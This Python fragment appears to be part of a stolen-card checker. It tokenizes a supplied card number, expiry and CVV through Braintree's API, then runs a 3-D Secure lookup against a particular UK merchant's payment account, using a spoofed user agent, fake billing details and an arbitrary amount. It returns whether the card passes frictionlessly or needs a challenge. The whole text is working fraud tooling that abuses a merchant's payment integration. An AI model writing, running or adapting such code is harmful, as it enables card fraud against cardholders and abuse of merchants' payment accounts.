	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'user-agent': user,
	}
	
	json_data = {
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok=response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'content-type': 'application/json',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': '700.22',
	    'additionalInfo': {
	        'billingLine1': 'S N S Local',
	        'billingLine2': '',
	        'billingCity': 'Budd Lake',
	        'billingPostalCode': 'BT10 1BE',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '50164597386',
	        'billingGivenName': '\\u006e\\u0064\\u006a\\u0073\\u006a\\u0078\\u006b\\u0078',
	        'billingSurname': '\\u0078\\u006a\\u0073\\u006a\\u0078\\u006b\\u0064\\u006b',
	    },
	    'bin': n[:6],
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.94.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 1050,
	        'issuerDeviceDataCollectionTimeElapsed': 7854,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.94.0',
	    '_meta': {
	        'merchantAppId': 'www.madfun.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.94.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '95f8861d-2a38-436c-9995-9b7fc8cd1490',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/twgvz672vys9k6ps/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	msg2 = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'challenge_required' in msg2:
		
		return 'challenge_required'
		
	elif 'authenticate_attempt_successful' in msg2:
		return 'authenticate_attempt_successful'
		
	elif 'authenticate_frictionless_failed' in msg2:
		return 'authenticate_frictionless_failed'		
	elif 'authenticate_successful' in msg2:		
		return 'authenticate_successful'		
	elif 'lookup_card_error' in msg2:
		return 'lookup_card_error'	
	elif 'lookup_error' in msg2:	
		return 'lookup_error'	
	else:
		return msg2
